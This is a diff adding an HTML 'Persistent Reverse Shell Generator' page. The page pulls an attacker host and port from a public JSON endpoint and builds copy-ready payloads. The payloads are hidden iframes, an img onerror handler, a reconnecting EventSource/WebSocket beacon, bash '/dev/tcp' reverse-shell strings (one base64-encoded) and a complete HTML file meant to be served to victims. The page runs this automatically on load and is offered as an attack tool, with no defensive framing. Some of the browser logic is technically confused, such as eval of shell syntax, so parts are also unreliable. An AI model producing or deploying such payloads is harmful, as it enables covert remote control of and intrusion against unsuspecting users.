@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Persistent Reverse Shell Generator</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background: #1a1a1a;
+            color: #00ff00;
+            padding: 20px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        .container {
+            background: #000;
+            padding: 20px;
+            border-radius: 8px;
+            border: 1px solid #333;
+        }
+        .payload-box {
+            background: #111;
+            border: 1px solid #00ff00;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 4px;
+            font-size: 12px;
+            white-space: pre-wrap;
+            word-break: break-all;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        .status {
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 4px;
+        }
+        .success { background: #004400; }
+        .error { background: #440000; }
+        button {
+            background: #00ff00;
+            color: #000;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-family: inherit;
+            font-weight: bold;
+        }
+        button:hover { background: #00cc00; }
+        .copy-btn {
+            background: #ffaa00;
+            color: #000;
+            font-size: 12px;
+            padding: 5px 10px;
+            margin-left: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔥 Persistent Reverse Shell Generator</h1>
+        <p><strong>Target:</strong> <span id="target-info">-</span></p>
+        
+        <button onclick="generatePayloads()">Generate Payloads</button>
+        <div id="status" class="status" style="display:none;"></div>
+        
+        <h3>📱 Android-Compatible WebSocket Payload</h3>
+        <div class="payload-box" id="wsPayload">-</div>
+        <button class="copy-btn" onclick="copyPayload('wsPayload')">Copy WS Payload</button>
+        
+        <h3>🌐 Multi-Vector TCP Payload</h3>
+        <div class="payload-box" id="tcpPayload">-</div>
+        <button class="copy-btn" onclick="copyPayload('tcpPayload')">Copy TCP Payload</button>
+        
+        <h3>💾 Ready-to-Serve HTML Payload</h3>
+        <div class="payload-box" id="htmlPayload">-</div>
+        <button class="copy-btn" onclick="copyPayload('htmlPayload')">Copy HTML File</button>
+    </div>
+
+    <script type="module">
+        // Fetch config from JSON silo
+        async function fetchData() {
+            try {
+                const response = await fetch('https://api.jsonsilo.com/public/3be60038-0dbc-4604-a3c1-3c60ed3313cb');
+                if (!response.ok) throw new Error('API response not ok');
+                const data = await response.json();
+                const host = data.host || data.ip || data.target || data.server;
+                const port = data.port || data.target_port || 4444;
+                return { host, port };
+            } catch (error) {
+                showStatus('❌ Failed to fetch target config: ' + error.message, 'error');
+                throw error;
+            }
+        }
+
+        // Generate all persistent payloads
+        async function generatePayloads() {
+            try {
+                showStatus('🔄 Fetching target config...', 'success');
+                const { host, port } = await fetchData();
+                
+                document.getElementById('target-info').textContent = `${host}:${port}`;
+                
+                // Persistent WebSocket + EventSource payload
+                const wsPayload = `let reconnectAttempts = 0;
+const MAX_ATTEMPTS = 100;
+function connectShell() {
+  if (reconnectAttempts >= MAX_ATTEMPTS) return;
+  reconnectAttempts++;
+  const iframe = document.createElement('iframe');
+  iframe.style.display = 'none';
+  iframe.src = 'about:blank';
+  document.body.appendChild(iframe);
+  const es = new EventSource('http://${host}:${port}/shell');
+  es.onopen = () => { console.log('Shell connected'); reconnectAttempts = 0; };
+  es.onerror = (e) => {
+    es.close();
+    const ws = new WebSocket('ws://${host}:${port}');
+    ws.onopen = () => { navigator.sendBeacon('http://${host}:${port}/cmd', 'whoami'); };
+    ws.onerror = () => { setTimeout(connectShell, 30000); };
+  };
+}
+connectShell(); setInterval(connectShell, 30000);`;
+
+                // Multi-vector TCP payload
+                const tcpPayload = `<iframe src="javascript:(function(){
+  let attempts = 0;
+  function persistentShell() {
+    if (attempts++ > 50) return;
+    try { eval('fetch("http://${host}:${port}/sh",{method:"POST",body:"sh -i >& /dev/tcp/${host}/${port} 0>&1"}).catch(()=>{})'); }
+    catch(e) {}
+    setTimeout(persistentShell, 30000);
+  }
+  persistentShell();
+})()"></iframe>
+<img src="x" onerror="fetch('http://${host}:${port}/shell').then(()=>eval('sh -i >& /dev/tcp/${host}/${port} 0>&1'))">
+<script>setInterval(()=>fetch('http://${host}:${port}/connect',{method:'POST',body:atob('c2ggLWkgPiYgL2Rldi90Y3AvJCh3aG9hbWkpLyR7UE9SVDowOjQ0NDR9ID4mMQ==')}),30000);</script>`;
+
+                // Complete HTML payload file
+                const htmlPayload = `<!DOCTYPE html><html><head><title></title></head><body style="margin:0;overflow:hidden">
+${wsPayload}
+${tcpPayload}
+</body></html>`;
+
+                // Update UI
+                document.getElementById('wsPayload').textContent = `<script>${wsPayload}</script>`;
+                document.getElementById('tcpPayload').innerHTML = tcpPayload;
+                document.getElementById('htmlPayload').textContent = htmlPayload;
+                
+                showStatus(`✅ Payloads generated for ${host}:${port} (30s persistence, Android-safe)`, 'success');
+                
+            } catch (error) {
+                showStatus('❌ ' + error.message, 'error');
+            }
+        }
+
+        // UI helpers
+        function showStatus(message, type) {
+            const statusEl = document.getElementById('status');
+            statusEl.textContent = message;
+            statusEl.className = `status ${type}`;
+            statusEl.style.display = 'block';
+            setTimeout(() => statusEl.style.display = 'none', 5000);
+        }
+
+        function copyPayload(type) {
+            const el = document.getElementById(type);
+            navigator.clipboard.writeText(el.textContent || el.innerText).then(() => {
+                showStatus('📋 Copied to clipboard!', 'success');
+            });
+        }
+
+        // Auto-generate on load
+        window.onload = generatePayloads;
+    </script>
+</body>
+</html>
